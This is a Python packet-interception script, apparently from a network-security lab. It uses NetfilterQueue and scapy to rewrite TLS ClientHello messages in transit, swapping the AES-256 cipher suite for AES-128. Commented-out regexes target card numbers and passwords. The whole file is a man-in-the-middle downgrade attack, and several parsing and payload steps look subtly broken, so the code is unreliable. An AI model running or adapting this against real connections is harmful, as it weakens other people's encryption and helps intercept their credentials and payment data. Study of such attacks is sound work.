from netfilterqueue import NetfilterQueue
from scapy.all import *
import re

#card_number_re = re.compile(r'cc --- (\d{4}\.\d{4}\.\d{4}\.\d{4})')
#password_re = re.compile(r'pwd --- ([0-9A-Z:;<=>?@]+)')

traffic_started = False
TYPE_HANDSHAKE = 22
HANDSHAKETYPE_CLIENT_HELLO = 1

TLS_TAG_SIZE = 2
RANDOM_NUM_SIZE = 32

SESSION_ID_SIZE = 4

CIPHER_SUITE_ID_SIZE = 2

AES_256 = b'\x00\x35'
AES_128 = b'\x00\x2f'

assert(len(AES_128) == CIPHER_SUITE_ID_SIZE)
assert(len(AES_256) == CIPHER_SUITE_ID_SIZE)

def perform_tls_downgrade_on_client_hello(handshake_message):
    sessionIdByte = TLS_TAG_SIZE + RANDOM_NUM_SIZE

    sessionIdlength = handshake_message[sessionIdByte]
    print('Session ID length:', sessionIdlength)
    
    cipherSuiteLengthByte = sessionIdByte + 1 + sessionIdlength * SESSION_ID_SIZE
    cipherSuiteLength = int.from_bytes(
        handshake_message[cipherSuiteLengthByte:cipherSuiteLengthByte + 2], 
        byteorder='big')
    print('Cipher Suite length:', cipherSuiteLength)
    cipher_suite_bytes = cipherSuiteLengthByte + 2
    
    for i in range(cipherSuiteLength):
        start_index = cipher_suite_bytes + CIPHER_SUITE_ID_SIZE * i
        current_cipher = handshake_message[start_index:start_index + CIPHER_SUITE_ID_SIZE]
        if current_cipher == AES_256:
            print(f'---- Cipher {i}:', 
                int.from_bytes(
                    current_cipher, 
                    byteorder='big'))
            handshake_message = handshake_message[:start_index] + \
               AES_128 + handshake_message[start_index + CIPHER_SUITE_ID_SIZE:]
            current_cipher = handshake_message[start_index:start_index + CIPHER_SUITE_ID_SIZE]
            print(f'---- Cipher {i} new:', 
                int.from_bytes(
                    current_cipher, 
                    byteorder='big'))

    return handshake_message

def print_and_accept(pkt):
    global traffic_started
    if not traffic_started:
        print('Traffic is starting...')
        traffic_started = True

    ip = IP(pkt.get_payload())

    if ip.haslayer(Raw):
        load = ip[Raw].load
        tls_type = load[0]
        if tls_type == TYPE_HANDSHAKE:
            handshake_load = load[5:]
            handshake_type = handshake_load[0]
            if handshake_type == HANDSHAKETYPE_CLIENT_HELLO:
                handshake_length = int.from_bytes(handshake_load[1:4], byteorder='big')
                handshake_message = handshake_load[4:4 + handshake_length]

                new_handshake_load = handshake_load[:4] + \
                    perform_tls_downgrade_on_client_hello(handshake_message)
                new_load = load[:5] + new_handshake_load
                pkt.set_payload(new_handshake_load)

    pkt.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(1, print_and_accept)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()